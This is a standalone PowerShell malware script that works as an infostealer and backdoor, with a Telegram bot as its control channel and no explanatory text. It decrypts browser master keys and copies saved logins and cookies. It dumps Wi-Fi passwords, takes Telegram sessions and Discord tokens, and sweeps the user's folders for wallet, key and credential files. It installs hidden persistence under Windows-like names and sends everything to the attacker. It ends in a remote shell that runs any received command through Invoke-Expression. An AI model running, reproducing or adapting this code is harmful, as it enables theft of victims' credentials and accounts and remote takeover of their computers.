$a = "AAH_rTUBDLAtFbjomRxeds-dXAuIv3nKbtI"
$b = "7536224035:"
$t = $b + $a
$c = "7048394156"
$g = "https://api.telegram.org/bot$t"

Add-Type -AssemblyName System.Security
Add-Type -AssemblyName System.Web

function Send-Exfil {
    param([string]$m, [string]$f)
    try {
        if ($m) { 
            $o = @{chat_id=$c; text=$m; parse_mode="Markdown"}
            Invoke-RestMethod -Uri "$g/sendMessage" -Method Post -Body ($o | ConvertTo-Json) -ContentType "application/json"
        }
        if ($f -and (Test-Path $f)) {
            curl.exe -X POST "$g/sendDocument" -F "chat_id=$c" -F "document=@$f"
        }
    } catch {}
}

function Get-MasterKey {
    param($lp)
    if (Test-Path $lp) {
        $j = Get-Content $lp | ConvertFrom-Json
        $k = [Convert]::FromBase64String($j.os_crypt.encrypted_key)
        $k = $k[5..$k.Length-1]
        return [System.Security.Cryptography.ProtectedData]::Unprotect($k, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
    }
}

function Get-DetailedSys {
    $i = "--- FULL SYSTEM REPORT ---`n"
    $i += "Computer: $env:COMPUTERNAME`n"
    $i += "User: $env:USERNAME`n"
    $i += "OS: $((Get-WmiObject Win32_OperatingSystem).Caption)`n"
    $i += "CPU: $((Get-WmiObject Win32_Processor).Name)`n"
    $i += "RAM: $((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory / 1GB) GB`n"
    $i += "Public IP: $(Invoke-RestMethod ipinfo.io/ip)`n"
    $i += "Local IP: $((Get-NetIPAddress -AddressFamily IPv4).IPAddress -join ', ')`n"
    $w = "`n--- WIFI NETWORKS ---`n"
    $p = netsh wlan show profiles | Select-String "\:(.+)$" | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }
    foreach ($n in $p) {
        $v = netsh wlan show profile name="$n" key=clear | Select-String "Key Content\W+\:(.+)$" | ForEach-Object { $_.Matches.Groups[1].Value.Trim() }
        $w += "SSID: $n | Pass: $v`n"
    }
    return $i + $w
}

function Deep-Search {
    $found = New-Object System.Collections.Generic.List[string]
    $drive = [System.IO.DriveInfo]::GetDrives() | Where-Object { $_.DriveType -eq 'Fixed' }
    $exts = @("*.jpg", "*.png", "*.pdf", "*.txt", "*.docx", "*.xlsx", "*.ppk", "*.key", "*.wallet")
    foreach ($d in $drive) {
        $root = $d.RootDirectory.FullName
        Get-ChildItem -Path "$root\Users\$env:USERNAME" -Include $exts -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
            if ($_.Name -match "pass|wallet|secret|seed|bank|crypto|login|id|card|auth|token") {
                if ($_.Length -lt 7MB) { $found.Add($_.FullName) }
            }
            elseif ($_.Extension -match "jpg|png" -and $_.LastWriteTime -gt (Get-Date).AddDays(-60)) {
                if ($_.Length -lt 5MB) { $found.Add($_.FullName) }
            }
        }
    }
    return $found
}

function Set-Persistence {
    try {
        $p = "$env:APPDATA\Microsoft\Windows\WinHostSvc.ps1"
        $m = $MyInvocation.MyCommand.Definition
        if ($m) { Copy-Item $m $p -Force }
        $key = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        Set-ItemProperty -Path $key -Name "WindowsHostProvider" -Value "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$p`""
        $act = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$p`""
        $trig = New-ScheduledTaskTrigger -AtLogOn
        Register-ScheduledTask -TaskName "WinSvcUpdate" -Action $act -Trigger $trig -Force | Out-Null
    } catch {}
}

function Remote-Shell {
    $l = 0
    while($true) {
        try {
            $r = Invoke-RestMethod -Uri "$g/getUpdates?offset=$($l + 1)"
            foreach($u in $r.result) {
                $l = $u.update_id
                $d = $u.message.text
                if ($u.message.chat.id -eq $c) {
                    if ($d -eq "screenshot") {
                        $f = "$env:TEMP\s.png"
                        Add-Type -AssemblyName System.Windows.Forms,System.Drawing
                        $b = New-Object Drawing.Bitmap ([Windows.Forms.Screen]::PrimaryScreen.Bounds.Width), ([Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
                        $g_img = [Drawing.Graphics]::FromImage($b)
                        $g_img.CopyFromScreen(0, 0, 0, 0, $b.Size)
                        $b.Save($f, [Drawing.Imaging.ImageFormat]::Png)
                        Send-Exfil -f $f
                        Remove-Item $f
                    } else {
                        $res = Invoke-Expression $d | Out-String
                        Send-Exfil -m "Output:`n$res"
                    }
                }
            }
        } catch {}
        Start-Sleep -Seconds 5
    }
}

function Start-FullInfection {
    Set-Persistence
    $wd = New-Item -ItemType Directory -Path "$env:TEMP\$(Get-Random)" -Force
    Get-DetailedSys | Out-File "$wd\System_Log.txt"
    
    $br = @{
        "Chrome" = "$env:LOCALAPPDATA\Google\Chrome\User Data";
        "Edge"   = "$env:LOCALAPPDATA\Microsoft\Edge\User Data";
        "Brave"  = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data";
        "Opera"  = "$env:APPDATA\Opera Software\Opera Stable"
    }
    
    foreach($k in $br.Keys) {
        $p = $br[$k]
        if (Test-Path "$p\Local State") {
            $mk = Get-MasterKey "$p\Local State"
            if ($mk) { [System.IO.File]::WriteAllBytes("$wd\$k_Master.key", $mk) }
            $paths = @("\Default\Login Data", "\Default\Web Data", "\Default\Network\Cookies")
            foreach($pth in $paths) {
                if (Test-Path "$p$pth") {
                    $fn = $k + $pth.Replace("\", "_") + ".db"
                    Copy-Item "$p$pth" "$wd\$fn" -Force
                }
            }
        }
    }

    $tg = "$env:APPDATA\Telegram Desktop\tdata"
    if (Test-Path $tg) {
        $z_tg = "$wd\TG_Session.zip"
        Compress-Archive -Path "$tg\D877F783D5D3EF8C*", "$tg\map*" -DestinationPath $z_tg -Force
    }
    
    $ds = "$env:APPDATA\discord\Local Storage\leveldb"
    if (Test-Path $ds) {
        Get-ChildItem $ds -Filter "*.ldb" | Select-String -Pattern "[\w-]{24}\.[\w-]{6}\.[\w-]{27}|mfa\.[\w-]{84}" | Out-File "$wd\DS_Tokens.txt"
    }

    $assets = Deep-Search
    foreach($file in $assets) {
        $dest = Join-Path $wd ([System.IO.Path]::GetFileName($file))
        Copy-Item $file -Destination $dest -ErrorAction SilentlyContinue
    }

    $final_z = "$env:TEMP\Final_Vault_$env:USERNAME.zip"
    Compress-Archive -Path "$($wd.FullName)\*" -DestinationPath $final_z -Force
    Send-Exfil -m "🔴 *Target Infiltrated*`nUser: $env:USERNAME`nAssets: $($assets.Count)`nStatus: Silent & Persistent"
    Send-Exfil -f $final_z
    
    Remove-Item $wd -Recurse -Force
    Remove-Item $final_z -Force
    Remote-Shell
}

Start-FullInfection
